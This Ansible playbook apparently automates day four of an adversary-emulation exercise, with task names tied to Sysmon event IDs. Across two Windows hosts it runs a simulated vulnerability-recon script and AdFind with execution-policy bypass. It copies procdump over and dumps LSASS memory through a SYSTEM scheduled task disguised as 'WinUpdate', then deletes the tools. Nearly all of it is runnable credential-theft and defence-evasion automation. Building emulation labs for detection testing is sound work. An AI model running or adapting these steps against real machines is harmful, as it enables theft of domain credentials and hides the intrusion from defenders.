---
# ansible/attack_day4.yml
# Day 4 - VulnRecon beachhead + Procdump LSASS + AdFind second run

- name: "Day 4 - BEACHHEAD-PC: VulnRecon + AdFind"
  hosts: BEACHHEAD-PC
  vars:
    ps1_dir: "{{ playbook_dir }}/../payloads/ps1"

  tasks:
    - name: "KILL - stop any running procdump"
      ansible.windows.win_shell: |
        Stop-Process -Name "procdump64" -Force -ErrorAction SilentlyContinue
        Stop-Process -Name "procdump" -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
      ignore_errors: yes

    - name: "CLEANUP - delete old VulnRecon files"
      ansible.windows.win_file:
        path: "{{ item }}"
        state: absent
      loop:
        - C:\ProgramData\VulnRecon.ps1
        - C:\ProgramData\vulnrecon_out.txt
        - C:\ProgramData\1.txt
        - C:\ProgramData\out.txt
      ignore_errors: yes

    - name: Drop vulnrecon_sim.ps1
      ansible.windows.win_copy:
        src: "{{ ps1_dir }}/vulnrecon_sim.ps1"
        dest: C:\ProgramData\VulnRecon.ps1

    - name: "VULNRECON - FindVulnerability"
      ansible.windows.win_shell: |
        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\VulnRecon.ps1 -FindVulnerability
      ignore_errors: yes

    - name: "VULNRECON - SystemInfo to 1.txt"
      ansible.windows.win_shell: |
        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\VulnRecon.ps1 -i | Out-File C:\ProgramData\1.txt
      ignore_errors: yes

    - name: "VULNRECON - MicrosoftUpdates"
      ansible.windows.win_shell: |
        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\VulnRecon.ps1 -m
      ignore_errors: yes

    - name: "VULNRECON - output to out.txt"
      ansible.windows.win_shell: |
        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\VulnRecon.ps1 -o | Out-File -Append C:\ProgramData\out.txt
      ignore_errors: yes

    - name: "ADFIND - second run"
      ansible.windows.win_shell: |
        powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\adfind_sub.ps1
      ignore_errors: yes

- name: "Day 4 - Both hosts: Procdump LSASS"
  hosts: BEACHHEAD-PC,YAMCHA-PC
  vars:
    tools_dir: "{{ playbook_dir }}/../payloads/tools"

  tasks:

    - name: "CLEANUP - delete old Procdump + dump files"
      ansible.windows.win_file:
        path: "{{ item }}"
        state: absent
      loop:
        - C:\ProgramData\procdump64.exe
        - C:\ProgramData\procdump.exe
        - C:\ProgramData\lsass.dmp
      ignore_errors: yes

    - name: "LATERAL TOOL TRANSFER - drop procdump64.exe (Sysmon Event 11)"
      ansible.windows.win_copy:
        src: "{{ tools_dir }}/procdump64.exe"
        dest: C:\ProgramData\procdump64.exe
      ignore_errors: yes

    - name: "LATERAL TOOL TRANSFER - drop procdump.exe"
      ansible.windows.win_copy:
        src: "{{ tools_dir }}/procdump.exe"
        dest: C:\ProgramData\procdump.exe
      ignore_errors: yes

    - name: "CREDENTIAL ACCESS - dump LSASS via scheduled task as SYSTEM (Sysmon Event 10)"
      ansible.windows.win_shell: |
        $action = New-ScheduledTaskAction -Execute "C:\ProgramData\procdump64.exe" `
          -Argument "-accepteula -ma lsass.exe C:\ProgramData\lsass.dmp"
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
        $settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        Register-ScheduledTask -TaskName "WinUpdate" -Action $action `
          -Trigger $trigger -Settings $settings -Principal $principal -Force
        Start-Sleep -Seconds 10
        Unregister-ScheduledTask -TaskName "WinUpdate" -Confirm:$false
        Write-Output "[+] LSASS dump complete"
      ignore_errors: yes

    - name: Wait for dump
      ansible.builtin.pause:
        seconds: 5

    - name: "DEFENSE EVASION - delete Procdump (Sysmon Event 23)"
      ansible.windows.win_file:
        path: "{{ item }}"
        state: absent
      loop:
        - C:\ProgramData\procdump64.exe
        - C:\ProgramData\procdump.exe
      ignore_errors: yes